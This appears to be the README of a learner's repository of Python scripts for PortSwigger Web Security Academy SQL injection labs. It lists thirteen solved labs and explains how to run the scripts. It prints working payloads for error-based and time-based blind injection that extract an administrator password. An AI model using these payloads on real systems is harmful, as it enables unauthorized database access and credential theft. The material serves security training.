# SQL injection
SQL injection (SQLi) is a technique where attackers insert malicious SQL commands into entry fields, allowing them to manipulate or retrieve data from a backend database without authorization.

## Labs completed

| # | Lab Name | Category | Status |
|---|---|---|---|
| 1 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | SQLi | ✅ Solved |
| 2 | SQL injection vulnerability allowing login bypass | SQLi | ✅ Solved |
| 3 | SQL injection UNION attack, determining the number of columns | SQLi | ✅ Solved |
| 4 | SQL injection UNION attack, finding a column containing text | SQLi | ✅ Solved |
| 5 | SQL injection UNION attack, retrieving data from other tables | SQLi | ✅ Solved |
| 6 | Blind SQL injection with conditional responses | SQLi | ✅ Solved |
| 7 | Blind SQL injection with conditional errors | SQLi | ✅ Solved |
| 8 | Visible error-based SQL injection | SQLi | ✅ Solved |
| 9 | Blind SQL injection with time delays | SQLi | ✅ Solved |
| 10 | Blind SQL injection with time delays and information retrieval | SQLi | ✅ Solved |
| 11 | SQL injection attack, querying the database type and version on Oracle | SQLi | ✅ Solved |
| 12 | SQL injection attack, querying the database type and version on MySQL and Microsoft | SQLi | ✅ Solved |
| 13 | SQL injection attack, listing the database contents on non-Oracle databases | SQLi | ✅ Solved |


## Built with
- Python 3
- requests module
- time module

## How to run

1. Install dependencies:
``` 
    pip install requests
```

2. Open the lab in your browser, go to DevTools -> Application -> Cookies and copy the TrackingId and session cookie values

3. Run the script:
``` 
    python SQLi/blind_sqli.py
    python SQLi/blind_sqli_error_based.py
    python SQLi/blind_sqli_time_delays.py
```

4. Enter the lab URL (with a category e.g. /filter?category=Gifts), TrackingId, and session ID when prompted

## Key Techniques

**Lab 8 — Visible error-based SQL injection**
Manual testing with Burp due to character limits and variable error formats.
**Payload:**
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

**Key insight:** Delete the original TrackingId value to free up character space for longer payloads. Error message leaks the password directly.

**Lab 9 — Blind SQL injection with time delays**
Uses pg_sleep() to create time-based oracle. Response time > 2 seconds = true condition.
Binary search on ASCII values extracts password character by character.
**Payload:**
'||(CASE WHEN (LENGTH((SELECT password from users where username='administrator')) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'
'||(CASE WHEN (ASCII(SUBSTR((SELECT password FROM users where username='administrator'), {i}, 1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'


## Updates
- v2: Implemented binary search for length and character extraction, added requests.Session() for connection reuse. Reduced requests from ~740 to ~146, runtime from ~20 mins to < 5mins.

## Disclaimer
This script is for educational use only on legal, intentionally vulnerable 
environments such as PortSwigger Web Security Academy labs.